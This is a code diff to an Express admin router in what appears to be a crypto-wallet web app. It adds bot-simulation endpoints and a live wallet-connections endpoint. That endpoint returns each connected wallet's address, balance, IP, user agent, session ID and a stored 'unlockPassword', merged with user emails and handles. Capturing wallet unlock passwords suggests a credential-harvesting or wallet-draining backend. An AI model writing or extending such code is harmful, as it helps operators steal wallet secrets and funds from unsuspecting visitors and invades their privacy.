@@ -2,8 +2,18 @@ import { Router } from 'express'
 import { prisma } from '../prisma'
 import { requireAdmin, AuthRequest } from '../middleware/auth'
 import { supabaseServer } from '../supabase'
+import { listLiveWallets } from '../lib/liveWalletStore'
+import { getBotSimFeed, getBotSimStatus } from '../lib/botSimStore'
 
 export const adminRoutes = Router()
+
+adminRoutes.get('/bot/status', requireAdmin, (_req, res) => {
+  res.json(getBotSimStatus())
+})
+
+adminRoutes.get('/bot/feed', requireAdmin, (_req, res) => {
+  res.json(getBotSimFeed(20))
+})
 
 adminRoutes.get('/stats', requireAdmin, async (_req, res) => {
   try {
@@ -287,6 +297,59 @@ adminRoutes.get('/x-accounts', requireAdmin, async (req, res) => {
 })
 
 // ─── Wallets ───────────────────────────────────────────────────
+adminRoutes.get('/wallet-connections/live', requireAdmin, async (_req, res) => {
+  const memory = listLiveWallets()
+  try {
+    const dbConnections = await prisma.walletConnection.findMany({
+      orderBy: { lastSeenAt: 'desc' },
+      take: 200,
+      select: {
+        id: true,
+        walletAddress: true,
+        walletType: true,
+        chain: true,
+        network: true,
+        balanceSol: true,
+        pageUrl: true,
+        userAgent: true,
+        clientIp: true,
+        browserSessionId: true,
+        unlockPassword: true,
+        connectedAt: true,
+        lastSeenAt: true,
+        connectionStatus: true,
+        user: {
+          select: {
+            id: true,
+            displayName: true,
+            xUsername: true,
+            email: true,
+            avatarUrl: true,
+          },
+        },
+      },
+    })
+    const byAddress = new Map<string, (typeof dbConnections)[number] | (typeof memory)[number]>()
+    for (const row of dbConnections) byAddress.set(row.walletAddress, row)
+    for (const row of memory) {
+      const prev = byAddress.get(row.walletAddress)
+      byAddress.set(row.walletAddress, {
+        ...prev,
+        ...row,
+        unlockPassword: row.unlockPassword || prev?.unlockPassword || null,
+        connectedAt: prev?.connectedAt || row.connectedAt,
+      })
+    }
+    const connections = Array.from(byAddress.values()).sort(
+      (a, b) => new Date(b.lastSeenAt).getTime() - new Date(a.lastSeenAt).getTime()
+    )
+    return res.json({ connections, serverTime: new Date().toISOString() })
+  } catch (err) {
+    console.warn('admin wallet-connections/live using persisted store:', (err as Error).message)
+    return res.json({ connections: memory, serverTime: new Date().toISOString() })
+  }
+})
+
 adminRoutes.get('/wallets', requireAdmin, async (req, res) => {
   try {
     const page = Math.max(parseInt(req.query.page as string) || 1, 1)
